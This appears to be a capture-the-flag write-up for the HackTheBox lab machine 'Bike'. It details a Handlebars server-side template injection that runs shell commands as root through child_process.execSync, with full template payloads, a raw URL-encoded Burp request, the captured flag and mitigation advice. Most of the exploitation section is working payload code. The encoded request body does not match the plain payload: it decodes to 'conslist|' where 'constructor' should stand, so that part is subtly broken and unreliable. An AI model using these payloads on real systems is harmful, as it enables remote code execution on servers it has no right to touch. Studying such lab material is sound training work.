# Bike - HackTheBox Starting Point Writeup

**Date:** 2026-04-13
**OS:** Linux
**IP Address:** 10.129.97.64
**Difficulty:** Very Easy (Tier 2)

---

# 1. Executive Summary

This writeup documents the exploitation process for the HackTheBox machine **Bike**. The machine focuses on **Server-Side Template Injection (SSTI)** in a Node.js environment using the **Handlebars** templating engine.

*   **Initial Access:** Gained by exploiting an SSTI vulnerability in the email subscription form on the web server.
*   **Privilege Escalation:** Access was achieved directly as the `root` user through the template injection payload.
*   **Key Learning Points:**
    *   Understanding how templating engines like Handlebars can be exploited if user input is not properly sanitized.
    *   Bypassing sandbox restrictions in Node.js environments using the `process` object.
    *   Identifying the importance of synchronous execution (`execSync`) for retrieving immediate command output in a response.

---

# 2. Reconnaissance & Enumeration

## 2.1. Nmap Scan

We started with a full port scan and service version detection:
```bash
nmap -sV -sC -oN nmap/Bike -p 22,80 10.129.97.64
```

| Port | Service | Version | Notes |
| :--- | :--- | :--- | :--- |
| 22 | SSH | OpenSSH 8.2p1 | Remote access |
| 80 | HTTP | Node.js (Express) | Main web application |

## 2.2. Web Enumeration

Visiting `http://10.129.97.64` shows a coming-soon page for "Bike" with an email subscription form.

### Identifying the Vulnerability
By entering potential template injection payloads into the email field, we observed that certain characters and tags influenced the application's output. 

When we entered common template tags, the application returned an error message that exposed the underlying technology:
- **Framework:** Express
- **Templating Engine:** Handlebars

The error stack trace mentioned:
`.../node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js...`

---

# 3. Exploitation (SSTI to RCE)

## 3.1. Vulnerability Analysis
*   **Vulnerability:** Server-Side Template Injection (SSTI).
*   **Vector:** The email input field reflected raw content back into a template without sanitization.
*   **Technology:** Handlebars (Node.js).

## 3.2. Payload Development

### 1. Initial Attempt (Standard RCE)
We first tried a standard Handlebars RCE payload from [HackTricks](https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#handlebars-nodejs):

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Result:** Error `ReferenceError: require is not defined`. This indicates that the `require` function is not directly available in the template's context.

### 2. Bypassing Restrictions (via `process`)
Handlebars templates in this environment have access to the global `process` object. We can use `process.mainModule.require` to access internal modules like `child_process`.

We updated the payload to use `execSync` so that the command output is returned immediately:

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Result:** The application returned `root`, confirming Command Injection as the root user.

## 3.3. Exploitation with Burp Suite

To efficiently test and exploit the SSTI vulnerability, we used **Burp Suite** to intercept and modify the HTTP requests.

### Step 1: Intercept the Request
After filling out the email form on the website, we intercepted the `POST` request using the Burp Suite Proxy. This allowed us to view the raw data being sent to the server.

### Step 2: Send to Repeater
We sent the intercepted request to the **Repeater** (`Ctrl + R`). This enabled us to modify the payload and re-send the request multiple times without having to manually interact with the browser each time.

### Step 3: Payload URL Encoding
Since the data is sent with the `Content-Type: application/x-www-form-urlencoded`, the template injection payload must be **URL-encoded**. Failing to encode characters like `{{`, `}}`, or spaces would cause the server to misinterpret the request.

In Burp Repeater, we pasted our Handlebars payload into the `email` parameter and used the built-in shortcut (`Ctrl + U`) to encode it.

### Step 4: Final Exploit Request
The final raw HTTP request sent via Burp Suite to retrieve the flag looked like this:

```http
POST / HTTP/1.1
Host: bike.htb
Content-Length: 1664
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://bike.htb
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://bike.htb/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

email=%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%2e%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%53%79%6e%63%28%27%63%61%74%20%2f%72%6f%6f%74%2f%66%6c%61%67%2e%74%78%74%27%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d%0a&action=Submit
```

### Step 5: Execute and Analyze
By clicking **Send**, we observed the server's response in the "Response" tab. The command output (`cat /root/flag.txt`) was reflected in the HTML body, confirming successful RCE.

---

# 4. Flag Retrieval

Using the successful RCE vector, we modified the payload to read the flag:

**Final Payload (Snippet):**
```javascript
"return process.mainModule.require('child_process').execSync('cat /root/flag.txt');"
```

**Response:**
```html
<p class="result">
    We will contact you at:       e
  2
  [object Object]
    function Function() { [native code] }
    2
    [object Object]
        6b258d726d287462d60c103d0142a81c
</p>
```

**Flag:** `6b258d726d287462d60c103d0142a81c`

---

# 5. Recommendations & Mitigation
1.  **Sanitize Input:** Never pass user-supplied input directly into a template engine's rendering function.
2.  **Use Contextual Escaping:** Ensure the templating engine is configured to treat input as data, not as code.
3.  **Principle of Least Privilege:** Run the Node.js application under a non-privileged user (e.g., `www-data` or `node`) instead of `root`.
4.  **Sandbox the Template Engine:** If user templates are necessary, use a highly restricted sandbox environment to prevent access to the global `process` or `require`.
